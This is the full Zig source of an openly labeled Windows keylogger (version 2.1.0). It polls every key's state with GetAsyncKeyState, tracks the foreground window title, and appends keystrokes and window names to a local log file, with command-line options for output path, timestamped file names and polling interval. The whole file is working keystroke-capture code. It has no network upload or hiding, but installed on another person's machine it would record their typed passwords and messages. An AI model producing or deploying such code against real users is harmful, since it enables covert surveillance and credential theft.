const VERSION = "2.1.0";
const std = @import("std");
const File = std.fs.File;
const Writer = std.Io.Writer;
const Allocator = std.mem.Allocator;
const ArenaAllocator = std.heap.ArenaAllocator;
const ArrayList = std.ArrayList;
const sleep = std.Thread.sleep;
const eql = std.mem.eql;
const argsAlloc = std.process.argsAlloc;
const argsWithAllocator = std.process.argsWithAllocator;
const argsFree = std.process.argsFree;
const print = std.debug.print;
const f = std.fmt.bufPrint;
const cTime = @cImport(@cInclude("time.h"));
const cWindows = @cImport({
    @cInclude("windows.h");
});
const parseInt = std.fmt.parseInt;

const PrevType = enum {
    init,
    window,
    key,
};

pub fn main() !void {
    var arena = ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();
    const allocator = arena.allocator();

    var stdout_buffer: [1024]u8 = undefined;
    var stdout_writer = File.stdout().writer(&stdout_buffer);
    const stdout = &stdout_writer.interface;

    const args = try argsAlloc(allocator);
    defer argsFree(allocator, args);

    var args_iter = try argsWithAllocator(allocator);
    defer args_iter.deinit();
    _ = args_iter.next();

    var arg_output_path = try ArrayList(u8).initCapacity(allocator, 1024);
    defer arg_output_path.deinit(allocator);

    var arg_verbose: u8 = 0;
    var arg_use_date = false;
    var arg_sleep: usize = 0;
    while (args_iter.next()) |arg| {
        if (eql(u8, arg, "-h") or eql(u8, arg, "--help")) {
            try printHeader(stdout);
            try printHelp(stdout);
            return;
        } else if (eql(u8, arg, "-v") or eql(u8, arg, "--verbose")) {
            arg_verbose = 1;
        } else if (eql(u8, arg, "-vv")) {
            arg_verbose = 2;
        } else if (eql(u8, arg, "-o") or eql(u8, arg, "--output")) {
            if (args_iter.next()) |next_arg| {
                arg_output_path.clearRetainingCapacity();
                try arg_output_path.appendSlice(allocator, next_arg);
            }
        } else if (eql(u8, arg, "-d") or eql(u8, arg, "--date")) {
            arg_use_date = true;
        } else if (eql(u8, arg, "-s") or eql(u8, arg, "--sleep")) {
            if (args_iter.next()) |next_arg| {
                arg_sleep = try parseInt(usize, next_arg, 10);
            }
        }
    }

    if (arg_output_path.items.len == 0) {
        if (arg_use_date) {
            const now = std.time.timestamp();
            const localtime = cTime.localtime(&now);

            var output_path_b: [1024]u8 = undefined;
            const output_path_l = cTime.strftime(&output_path_b, 255, "keylogger_%Y%m%d_%H%M%S.log", localtime);
            const output_path_s: []u8 = output_path_b[0..output_path_l];
            try arg_output_path.appendSlice(allocator, output_path_s);
        } else {
            try arg_output_path.appendSlice(allocator, "keylogger.log");
        }
    }
    if (arg_sleep <= 3) {
        arg_sleep = 10;
    }
    arg_sleep *= std.time.ns_per_ms;

    const file_exists = fileExists(allocator, arg_output_path.items);

    if (arg_verbose >= 1) {
        try printHeader(stdout);
        try stdout.print("output file exists: {any}\n", .{file_exists});
        try stdout.print("output file path: {s}\n", .{arg_output_path.items});
        try stdout.print("sleep: {d}\n", .{arg_sleep});
        try stdout.flush();
    }

    const dir = std.fs.cwd();
    var file = try dir.createFile(arg_output_path.items, .{
        .truncate = false,
    });
    defer file.close(); // Actually never reached because of while(true).
    try file.seekFromEnd(0); // Append to end.

    const title_len: usize = 1024;
    const title_len_i: c_uint = @intCast(title_len - 1);
    const ctitle_b = try allocator.alloc(u8, title_len);
    const ptitle_b = try allocator.alloc(u8, title_len);

    const key_len: usize = 255;
    const key_name_b = try allocator.alloc(u8, key_len);

    for (0..title_len) |n| ctitle_b[n] = 0;
    for (0..title_len) |n| ptitle_b[n] = 0;
    for (0..key_len) |n| key_name_b[n] = 0;

    var prev_type: PrevType = .init;
    while (true) {
        sleep(arg_sleep);

        const hwnd: cWindows.HWND = cWindows.GetForegroundWindow();
        const ctitle_len = cWindows.GetWindowTextA(hwnd, ctitle_b.ptr, title_len_i);
        const ctitle_len_u: usize = @intCast(ctitle_len);
        const ctitle_s: []u8 = ctitle_b[0..ctitle_len_u];

        if (!eql(u8, ptitle_b, ctitle_b)) {
            if (arg_verbose >= 1) {
                print("window: ({d}) '{s}' \n", .{ ctitle_len_u, ctitle_s });
            }
            switch (prev_type) {
                .init => {
                    if (file_exists) {
                        try file.writeAll("\n");
                    }
                },
                .window => {},
                .key => try file.writeAll("\n"),
            }
            try file.writeAll("window: '");
            try file.writeAll(ctitle_s);
            try file.writeAll("'\n");
            @memcpy(ptitle_b, ctitle_b);
            prev_type = .window;
        }

        var key_i: u8 = 1;
        while (key_i < 255) : (key_i += 1) {
            const key_state: cWindows.SHORT = cWindows.GetAsyncKeyState(key_i);
            if (key_state & 1 != 0) {
                const key_name_s = getKeyName(key_name_b, key_i);
                if (arg_verbose >= 1) {
                    print("key: '{s}' ({d})\n", .{ key_name_s, key_i });
                }
                try file.writeAll(key_name_s);
                prev_type = .key;
            }
        }
    }
}

fn printHeader(stdout: *Writer) !void {
    try stdout.print("Keylogger " ++ VERSION ++ "\n", .{});
    try stdout.print("Copyright (C) 2009, 2025 Christian Mayer <https://fox21.at>\n\n", .{});
    try stdout.flush();
}

fn printHelp(stdout: *Writer) !void {
    const help =
        \\Usage: keylogger.exe [<options>]
        \\
        \\Options:
        \\-h, --help                Print this help.
        \\-v, --verbose             Verbose output.
        \\-o, --output <path>       Output file path. Accepts datetime format. Default: keylogger.log
        \\-d, --date                Will use date and time in the default output filename. Default: keylogger_%Y%m%d_%H%M%S.log
        \\-s, --sleep <msec>        Time to sleep in milliseconds. Default: 10
    ;
    try stdout.print(help ++ "\n", .{});
    try stdout.flush();
}

fn fileExists(allocator: Allocator, path: []const u8) bool {
    const c_str = allocator.dupeZ(u8, path) catch unreachable;
    defer allocator.free(c_str); // Not really needed in the context of this program.
    const attrs = cWindows.GetFileAttributesA(c_str);
    return attrs != cWindows.INVALID_FILE_ATTRIBUTES;
}

fn getKeyName(kn: []u8, ki: u8) []u8 {
    const x = (switch (ki) {
        1 => f(kn, "[LMOUSE]", .{}),
        2 => f(kn, "[RMOUSE]", .{}),
        4 => f(kn, "[MMOUSE]", .{}),
        13 => f(kn, "[RETURN]", .{}),
        8 => f(kn, "[BACKSPACE]", .{}),
        9 => f(kn, "[TAB]", .{}),
        27 => f(kn, "[ESC]", .{}),
        32 => f(kn, "[SPACE]", .{}),
        33 => f(kn, "[PAGE UP]", .{}),
        34 => f(kn, "[PAGE DOWN]", .{}),
        35 => f(kn, "[HOME]", .{}),
        36 => f(kn, "[POS1]", .{}),
        37 => f(kn, "[ARROW LEFT]", .{}),
        38 => f(kn, "[ARROW UP]", .{}),
        39 => f(kn, "[ARROW RIGHT]", .{}),
        40 => f(kn, "[ARROW DOWN]", .{}),
        44 => f(kn, "[PRINT]", .{}),
        45 => f(kn, "[INS]", .{}),
        46 => f(kn, "[DEL]", .{}),
        65...90 => f(kn, "{c}", .{ki}),
        91, 92 => f(kn, "[WIN]", .{}),
        96...105 => f(kn, "[NUM {d}]", .{ki - 96}),
        106 => f(kn, "[NUM *]", .{}),
        107 => f(kn, "[NUM +]", .{}),
        109 => f(kn, "[NUM -]", .{}),
        110 => f(kn, "[NUM ,]", .{}),
        111 => f(kn, "[NUM /]", .{}),
        112...123 => f(kn, "[F{d}]", .{ki - 111}),
        144 => f(kn, "[NUM]", .{}),
        145 => f(kn, "[ROLL]", .{}),
        160, 161 => f(kn, "[SHIFT]", .{}),
        162, 163 => f(kn, "[STRG]", .{}),
        164 => f(kn, "[ALT]", .{}),
        165 => f(kn, "[ALT GR]", .{}),
        186 => f(kn, "[UE]", .{}), // ü
        187 => f(kn, "+", .{}),
        188 => f(kn, ",", .{}),
        189 => f(kn, "-", .{}),
        190 => f(kn, ".", .{}),
        191 => f(kn, "#", .{}),
        192 => f(kn, "[OE]", .{}), // ö
        219 => f(kn, "[SS]", .{}), // ß
        222 => f(kn, "[AE]", .{}), // ä
        226 => f(kn, "<", .{}),
        else => f(kn, "[KEY \\{d}]", .{ki}),
    }) catch @panic("bufPrint failed");
    return x;
}
